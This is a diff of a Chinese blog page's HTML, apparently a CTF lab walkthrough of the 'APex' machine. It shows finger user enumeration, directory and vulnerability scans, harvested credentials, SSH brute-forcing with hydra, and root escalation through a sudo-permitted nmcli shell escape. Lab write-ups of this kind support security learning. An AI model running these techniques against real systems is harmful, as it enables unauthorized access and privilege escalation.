@@ -768,7 +768,7 @@ Starting gobuster in directory enumeration mode
 <meta property="og:url" content="https://7r1UMPH.github.io/post/nyx_APex.html">
 <meta property="og:image" content="https://7r1umph.top/image/202506121404919.webp">
 <title>nyx_APex</title>
-<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
 
 
 </head>
@@ -862,10 +862,10 @@ Nmap done: 1 IP address (1 host up) scanned in 1.56 seconds
 <p>在hacktricks搜索到了相关<a href="https://book.hacktricks.wiki/zh/network-services-pentesting/pentesting-finger.html#79---pentesting-finger" rel="nofollow">网页</a></p>
 <p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/f8704be5-49b0-4ede-8d26-fae86b96ee0a"><img src="https://github.com/user-attachments/assets/f8704be5-49b0-4ede-8d26-fae86b96ee0a" alt="Image" style="max-width: 100%;"></a></p>
 <p>有Metasploit的脚本，我们优先利用一下</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ msfconsole
-msf6 <span class="pl-k">&gt;</span> use auxiliary/scanner/finger/finger_users
-msf6 auxiliary(scanner/finger/finger_users) <span class="pl-k">&gt;</span> show options 
+msf6 &gt; use auxiliary/scanner/finger/finger_users
+msf6 auxiliary(scanner/finger/finger_users) &gt; show options 
 
 Module options (auxiliary/scanner/finger/finger_users):
 
@@ -881,9 +881,9 @@ Module options (auxiliary/scanner/finger/finger_users):
 
 View the full module info with the info, or info -d command.
 
-msf6 auxiliary(scanner/finger/finger_users) <span class="pl-k">&gt;</span> <span class="pl-c1">set</span> RHOSTS 192.168.205.148
-RHOSTS =<span class="pl-k">&gt;</span> 192.168.205.148
-msf6 auxiliary(scanner/finger/finger_users) <span class="pl-k">&gt;</span> run
+msf6 auxiliary(scanner/finger/finger_users) &gt; set RHOSTS 192.168.205.148
+RHOSTS =&gt; 192.168.205.148
+msf6 auxiliary(scanner/finger/finger_users) &gt; run
 [+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: _apt
 [+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: backup
 [+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: bin
@@ -912,12 +912,13 @@ msf6 auxiliary(scanner/finger/finger_users) <span class="pl-k">&gt;</span> run
 [+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: uuidd
 [+] 192.168.205.148:79    - 192.168.205.148:79 - Found user: www-data
 [+] 192.168.205.148:79    - 192.168.205.148:79 Users found: _apt, backup, bin, daemon, dnsmasq, games, gnats, irc, list, lp, mail, man, messagebus, news, nobody, proxy, root, sshd, sync, sys, systemd-coredump, systemd-network, systemd-resolve, systemd-timesync, uucp, uuidd, www-data
-[<span class="pl-k">*</span>] 192.168.205.148:79    - Scanned 1 of 1 hosts (100% complete)
-[<span class="pl-k">*</span>] Auxiliary module execution completed
-</pre></div>
+[*] 192.168.205.148:79    - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+</code></pre>
 <p>提取数据进行爆破</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
-└─$ cat user <span class="pl-k">|</span>awk -F <span class="pl-s"><span class="pl-pds">'</span>: <span class="pl-pds">'</span></span> <span class="pl-s"><span class="pl-pds">'</span>{print $2}<span class="pl-pds">'</span></span>
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ cat user |awk -F ': ' '{print $2}'
 _apt
 backup
 bin
@@ -946,7 +947,7 @@ uucp
 uuidd
 www-data
 ┌──(kali㉿kali)-[~/test]
-└─$ <span class="pl-k">while</span> <span class="pl-c1">read</span> -r user<span class="pl-k">;</span> <span class="pl-k">do</span> <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-smi">$user</span><span class="pl-pds">"</span></span> <span class="pl-k">|</span> nc -vn 192.168.205.148 79<span class="pl-k">;</span> <span class="pl-k">done</span> <span class="pl-k">&lt;</span> user
+└─$ while read -r user; do echo "$user" | nc -vn 192.168.205.148 79; done &lt; user
 (UNKNOWN) [192.168.205.148] 79 (finger) open
 Login: _apt                             Name: 
 Directory: /nonexistent                 Shell: /usr/sbin/nologin
@@ -1109,15 +1110,16 @@ Directory: /var/www                     Shell: /usr/sbin/nologin
 Never logged in.
 No mail.
 No Plan.
-</pre></div>
+
+</code></pre>
 <p>没有有意思的东西，我们去看看Web服务吧</p>
 <p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/0729089c-c77a-498c-919d-b511a966991b"><img src="https://github.com/user-attachments/assets/0729089c-c77a-498c-919d-b511a966991b" alt="Image" style="max-width: 100%;"></a></p>
 <p>没有有意思的东西，源码也没有，我们去爆破目录</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
-└─$ gobuster dir -u <span class="pl-s"><span class="pl-pds">"</span>http://192.168.205.148<span class="pl-pds">"</span></span> -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ gobuster dir -u "http://192.168.205.148" -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md
 ===============================================================
 Gobuster v3.6
-by OJ Reeves (@TheColonial) <span class="pl-k">&amp;</span> Christian Mehlmauer (@firefart)
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
 ===============================================================
 [+] Url:                     http://192.168.205.148
 [+] Method:                  GET
@@ -1128,46 +1130,47 @@ by OJ Reeves (@TheColonial) <span class="pl-k">&amp;</span> Christian Mehlmauer 
 [+] Extensions:              html,txt,md,php
 [+] Timeout:                 10s
 ===============================================================
-Starting gobuster <span class="pl-k">in</span> directory enumeration mode
+Starting gobuster in directory enumeration mode
 ===============================================================
 /backup               (Status: 401) [Size: 462]
 /index.html           (Status: 200) [Size: 878]
 /server-status        (Status: 403) [Size: 280]
 /.html                (Status: 403) [Size: 280]
-</pre></div>
+
+</code></pre>
 <p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/0b5297e8-5474-4c34-a645-bc01e1b882d7"><img src="https://github.com/user-attachments/assets/0b5297e8-5474-4c34-a645-bc01e1b882d7" alt="Image" style="max-width: 100%;"></a></p>
 <p>好像找到重点了，扫描一下架构</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ nuclei -u 192.168.205.148                      
 
                      __     _
    ____  __  _______/ /__  (_)
-  / __ <span class="pl-cce">\/</span> / / / ___/ / _ <span class="pl-cce">\/</span> /
+  / __ \/ / / / ___/ / _ \/ /
  / / / / /_/ / /__/ /  __/ /
-/_/ /_/<span class="pl-cce">\_</span>_,_/<span class="pl-cce">\_</span>__/_/<span class="pl-cce">\_</span>__/_/   v3.3.8
+/_/ /_/\__,_/\___/_/\___/_/   v3.3.8
 
                 projectdiscovery.io
 
-[WRN] Found 2 templates with runtime error (use -validate flag <span class="pl-k">for</span> further examination)
+[WRN] Found 2 templates with runtime error (use -validate flag for further examination)
 [INF] Current nuclei version: v3.3.8 (latest)
 [INF] Current nuclei-templates version: v10.1.2 (latest)
 [WRN] Scan results upload to cloud is disabled.
-[INF] New templates added <span class="pl-k">in</span> latest release: 52
-[INF] Templates loaded <span class="pl-k">for</span> current scan: 7656
+[INF] New templates added in latest release: 52
+[INF] Templates loaded for current scan: 7656
 [INF] Executing 7276 signed templates from projectdiscovery/nuclei-templates
-[WRN] Loading 380 unsigned templates <span class="pl-k">for</span> scan. Use with caution.
-[INF] Targets loaded <span class="pl-k">for</span> current scan: 1
+[WRN] Loading 380 unsigned templates for scan. Use with caution.
+[INF] Targets loaded for current scan: 1
 [INF] Running httpx on input host
 [INF] Found 1 URL from httpx
 [INF] Templates clustered: 1698 (Reduced 1598 Requests)
 [INF] Using Interactsh Server: oast.fun
 [waf-detect:apachegeneric] [http] [info] http://192.168.205.148
 [ssh-sha1-hmac-algo] [javascript] [info] 192.168.205.148:22
-[ssh-server-enumeration] [javascript] [info] 192.168.205.148:22 [<span class="pl-s"><span class="pl-pds">"</span>SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3<span class="pl-pds">"</span></span>]
+[ssh-server-enumeration] [javascript] [info] 192.168.205.148:22 ["SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3"]
 [ssh-password-auth] [javascript] [info] 192.168.205.148:22
-[ssh-auth-methods] [javascript] [info] 192.168.205.148:22 [<span class="pl-s"><span class="pl-pds">"</span>[<span class="pl-pds">"</span></span>publickey<span class="pl-s"><span class="pl-pds">"</span>,<span class="pl-pds">"</span></span>password<span class="pl-s"><span class="pl-pds">"</span>]<span class="pl-pds">"</span></span>]
-[openssh-detect] [tcp] [info] 192.168.205.148:22 [<span class="pl-s"><span class="pl-pds">"</span>SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3<span class="pl-pds">"</span></span>]
-[options-method] [http] [info] http://192.168.205.148 [<span class="pl-s"><span class="pl-pds">"</span>HEAD,GET,POST,OPTIONS<span class="pl-pds">"</span></span>]
+[ssh-auth-methods] [javascript] [info] 192.168.205.148:22 ["["publickey","password"]"]
+[openssh-detect] [tcp] [info] 192.168.205.148:22 ["SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3"]
+[options-method] [http] [info] http://192.168.205.148 ["HEAD,GET,POST,OPTIONS"]
 [http-missing-security-headers:x-frame-options] [http] [info] http://192.168.205.148
 [http-missing-security-headers:x-content-type-options] [http] [info] http://192.168.205.148
 [http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://192.168.205.148
@@ -1179,12 +1182,13 @@ Starting gobuster <span class="pl-k">in</span> directory enumeration mode
 [http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://192.168.205.148
 [http-missing-security-headers:referrer-policy] [http] [info] http://192.168.205.148
 [http-missing-security-headers:clear-site-data] [http] [info] http://192.168.205.148
-[apache-detect] [http] [info] http://192.168.205.148 [<span class="pl-s"><span class="pl-pds">"</span>Apache/2.4.62 (Debian)<span class="pl-pds">"</span></span>]
-</pre></div>
+[apache-detect] [http] [info] http://192.168.205.148 ["Apache/2.4.62 (Debian)"]
+
+</code></pre>
 <p>无果，拷一份网站下来，还是没有东西。仔细想想好像就只有那个法老有特色了，搜一下</p>
 <p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/7b416ee3-6a1d-4b80-af63-1f7082cc352e"><img src="https://github.com/user-attachments/assets/7b416ee3-6a1d-4b80-af63-1f7082cc352e" alt="Image" style="max-width: 100%;"></a></p>
 <p>等会，不会是在那个79服务看这个人的信息吧</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ nc -vn 192.168.205.148 79
 (UNKNOWN) [192.168.205.148] 79 (finger) open
 Horus
@@ -1200,26 +1204,28 @@ Never logged in.
 Mail forwarded to horus@point.nyx
 No mail.
 PGP key:
-personal notes: H0Ru<span class="pl-smi">$$</span>3rv3
-No Plan.</pre></div>
+personal notes: H0Ru$$3rv3
+No Plan.
+</code></pre>
 <p>我去.....</p>
 <p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/eeaaa4aa-fc48-4495-aa84-0f190d6c8afa"><img src="https://github.com/user-attachments/assets/eeaaa4aa-fc48-4495-aa84-0f190d6c8afa" alt="Image" style="max-width: 100%;"></a></p>
 <p>下载下来看看</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
-└─$ sqlite3 <span class="pl-k">~</span>/Downloads/database.db 
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ sqlite3 ~/Downloads/database.db 
 SQLite version 3.46.1 2024-08-13 09:16:08
-Enter <span class="pl-s"><span class="pl-pds">"</span>.help<span class="pl-pds">"</span></span> <span class="pl-k">for</span> usage hints.
-sqlite<span class="pl-k">&gt;</span> .tables
+Enter ".help" for usage hints.
+sqlite&gt; .tables
 users
-sqlite<span class="pl-k">&gt;</span> <span class="pl-k">select</span> <span class="pl-smi">*</span> from users
-   ...<span class="pl-k">&gt;</span> <span class="pl-k">;</span>
-1<span class="pl-k">|</span>anubis<span class="pl-k">|</span>L44NxKRnP7wxrBsxibpDORySkbEHRO
-2<span class="pl-k">|</span>amon<span class="pl-k">|</span>xqRu08ZA3BihR4lKdJVYcP1x6HjZUf
-3<span class="pl-k">|</span>seth<span class="pl-k">|</span>Hm7iYkj2jXDxPUwoW2COs42YjPaC4P
-4<span class="pl-k">|</span>osiris<span class="pl-k">|</span>ITA96l3isg4uV2Sm8eYn41XVfxprFy</pre></div>
+sqlite&gt; select * from users
+   ...&gt; ;
+1|anubis|L44NxKRnP7wxrBsxibpDORySkbEHRO
+2|amon|xqRu08ZA3BihR4lKdJVYcP1x6HjZUf
+3|seth|Hm7iYkj2jXDxPUwoW2COs42YjPaC4P
+4|osiris|ITA96l3isg4uV2Sm8eYn41XVfxprFy
+</code></pre>
 <p>尝试爆破</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
-└─$ cat tmp<span class="pl-k">|</span>awk -F <span class="pl-s"><span class="pl-pds">'</span>|<span class="pl-pds">'</span></span> <span class="pl-s"><span class="pl-pds">'</span>{print $2}<span class="pl-pds">'</span></span>
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+└─$ cat tmp|awk -F '|' '{print $2}'
 anubis
 amon
 seth
@@ -1227,7 +1233,7 @@ osiris
 
                                                                                                                                      
 ┌──(kali㉿kali)-[~/test]
-└─$ cat tmp<span class="pl-k">|</span>awk -F <span class="pl-s"><span class="pl-pds">'</span>|<span class="pl-pds">'</span></span> <span class="pl-s"><span class="pl-pds">'</span>{print $2}<span class="pl-pds">'</span></span> <span class="pl-k">&gt;</span> user
+└─$ cat tmp|awk -F '|' '{print $2}' &gt; user
                                                                                                                                      
 ┌──(kali㉿kali)-[~/test]
 └─$ cat user      
@@ -1238,7 +1244,7 @@ osiris
 
                                                                                                                                      
 ┌──(kali㉿kali)-[~/test]
-└─$ cat tmp<span class="pl-k">|</span>awk -F <span class="pl-s"><span class="pl-pds">'</span>|<span class="pl-pds">'</span></span> <span class="pl-s"><span class="pl-pds">'</span>{print $3}<span class="pl-pds">'</span></span> <span class="pl-k">&gt;</span> pass
+└─$ cat tmp|awk -F '|' '{print $3}' &gt; pass
                                                                                                                                      
 ┌──(kali㉿kali)-[~/test]
 └─$ cat pass                            
@@ -1247,43 +1253,46 @@ xqRu08ZA3BihR4lKdJVYcP1x6HjZUf
 Hm7iYkj2jXDxPUwoW2COs42YjPaC4P
 ITA96l3isg4uV2Sm8eYn41XVfxprFy
 
-                                      </pre></div>
+                                      
+</code></pre>
 <p>hydra启动</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ hydra -L user -P pass ssh://192.168.205.148 -I -u -f -e nsr -t 64 
-Hydra v9.5 (c) 2023 by van Hauser/THC <span class="pl-k">&amp;</span> David Maciejak - Please <span class="pl-k">do</span> not use <span class="pl-k">in</span> military or secret service organizations, or <span class="pl-k">for</span> illegal purposes (this is non-binding, these <span class="pl-k">***</span> ignore laws and ethics anyway).
+Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-22 19:49:56
 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
-[DATA] max 40 tasks per 1 server, overall 40 tasks, 40 login tries (l:5/p:8), <span class="pl-k">~</span>1 try per task
+[DATA] max 40 tasks per 1 server, overall 40 tasks, 40 login tries (l:5/p:8), ~1 try per task
 [DATA] attacking ssh://192.168.205.148:22/
 [22][ssh] host: 192.168.205.148   login: seth   password: xqRu08ZA3BihR4lKdJVYcP1x6HjZUf
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-22 19:49:58
-</pre></div>
+
+</code></pre>
 <p>登录</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~/test]
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
 └─$ ssh seth@192.168.205.148     
-The authenticity of host <span class="pl-s"><span class="pl-pds">'</span>192.168.205.148 (192.168.205.148)<span class="pl-pds">'</span></span> can<span class="pl-s"><span class="pl-pds">'</span>t be established.</span>
-<span class="pl-s">ED25519 key fingerprint is SHA256:3dqq7f/jDEeGxYQnF2zHbpzEtjjY49/5PvV5/4MMqns.</span>
-<span class="pl-s">This key is not known by any other names.</span>
-<span class="pl-s">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span>
-<span class="pl-s">Warning: Permanently added <span class="pl-pds">'</span></span>192.168.205.148<span class="pl-s"><span class="pl-pds">'</span> (ED25519) to the list of known hosts.</span>
-<span class="pl-s">seth@192.168.205.148<span class="pl-pds">'</span></span>s password: 
-seth@apex:<span class="pl-k">~</span>$ id
+The authenticity of host '192.168.205.148 (192.168.205.148)' can't be established.
+ED25519 key fingerprint is SHA256:3dqq7f/jDEeGxYQnF2zHbpzEtjjY49/5PvV5/4MMqns.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.205.148' (ED25519) to the list of known hosts.
+seth@192.168.205.148's password: 
+seth@apex:~$ id
 uid=1001(seth) gid=1001(seth) grupos=1001(seth)
-</pre></div>
+
+</code></pre>
 <h1>3.提权</h1>
-<div class="highlight highlight-source-shell"><pre class="notranslate">seth@apex:<span class="pl-k">~</span>$ sudo -l
+<pre lang="bash" class="notranslate"><code class="notranslate">seth@apex:~$ sudo -l
 -bash: sudo: orden no encontrada
-seth@apex:<span class="pl-k">~</span>$ which sudo
-seth@apex:<span class="pl-k">~</span>$ cat /etc/sudo
+seth@apex:~$ which sudo
+seth@apex:~$ cat /etc/sudo
 sudo.conf          sudoers            sudoers.d/         sudo_logsrvd.conf  
-seth@apex:<span class="pl-k">~</span>$ cat /etc/sudoers
+seth@apex:~$ cat /etc/sudoers
 cat: /etc/sudoers: Permiso denegado
-seth@apex:<span class="pl-k">~</span>$ /etc/sudo -l
+seth@apex:~$ /etc/sudo -l
 -bash: /etc/sudo: No existe el fichero o el directorio
-seth@apex:<span class="pl-k">~</span>$ find / -name sudo <span class="pl-k">2&gt;</span>/dev/null
+seth@apex:~$ find / -name sudo 2&gt;/dev/null
 /var/lib/sudo
 /etc/init.d/sudo
 /etc/pam.d/sudo
@@ -1293,21 +1302,23 @@ seth@apex:<span class="pl-k">~</span>$ find / -name sudo <span class="pl-k">2&gt
 /usr/share/bash-completion/completions/sudo
 /usr/share/doc/sudo
 /usr/lib/sudo
-seth@apex:<span class="pl-k">~</span>$ /run/sudo -l
+seth@apex:~$ /run/sudo -l
 -bash: /run/sudo: Es un directorio
-seth@apex:<span class="pl-k">~</span>$ /usr/sbin/sudo -l
-Matching Defaults entries <span class="pl-k">for</span> seth on apex:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin<span class="pl-cce">\:</span>/usr/local/bin<span class="pl-cce">\:</span>/usr/sbin<span class="pl-cce">\:</span>/usr/bin<span class="pl-cce">\:</span>/sbin<span class="pl-cce">\:</span>/bin
+seth@apex:~$ /usr/sbin/sudo -l
+Matching Defaults entries for seth on apex:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
 
 User seth may run the following commands on apex:
     (root) NOPASSWD: /usr/bin/nmcli
-</pre></div>
+
+</code></pre>
 <p>还真有人干这事啊，然后我就卡住了。等到8点群里大佬发了wp我才发现又是缩小提权</p>
 <p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/925d251b-9ebe-4070-8f1d-29c36a9ff4b3"><img src="https://github.com/user-attachments/assets/925d251b-9ebe-4070-8f1d-29c36a9ff4b3" alt="Image" style="max-width: 100%;"></a></p>
 <p>在城南花已开大佬的wp看到了原理：</p>
 <p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/de0b5181-4c5f-48bd-a894-4e312e8c9bb8"><img src="https://github.com/user-attachments/assets/de0b5181-4c5f-48bd-a894-4e312e8c9bb8" alt="Image" style="max-width: 100%;"></a></p>
-<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-k">!</span>/bin/bash
-root@apex:/home/seth# iduid=0(root) gid=0(root) grupos=0(root)</pre></div>
+<pre lang="bash" class="notranslate"><code class="notranslate">!/bin/bash
+root@apex:/home/seth# iduid=0(root) gid=0(root) grupos=0(root)
+</code></pre>
 <p>以下也是大佬的思路</p>
 <p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/1d094ada-fae5-4d7d-987a-79cae98e0126"><img src="https://github.com/user-attachments/assets/1d094ada-fae5-4d7d-987a-79cae98e0126" alt="Image" style="max-width: 100%;"></a></p></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
